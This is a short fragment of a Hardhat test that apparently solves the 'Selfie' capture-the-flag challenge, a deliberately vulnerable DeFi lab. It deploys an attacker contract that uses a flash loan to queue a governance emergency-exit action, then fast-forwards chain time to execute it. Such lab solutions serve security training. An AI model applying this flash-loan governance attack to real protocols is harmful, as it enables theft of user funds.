...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    ...
    // attack to get the flashloan and queuing the emergencyExit action
    const attacker = await (
      await ethers.getContractFactory("SelfieAttacker", deployer)
    ).deploy(pool.address, token.address, governance.address, player.address);

    await attacker.attack(TOKENS_IN_POOL);
    const actionId = await attacker.actionId();
    
    // wait 2 days before beiing able to execute the action
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

    // executing the emergencyExit action
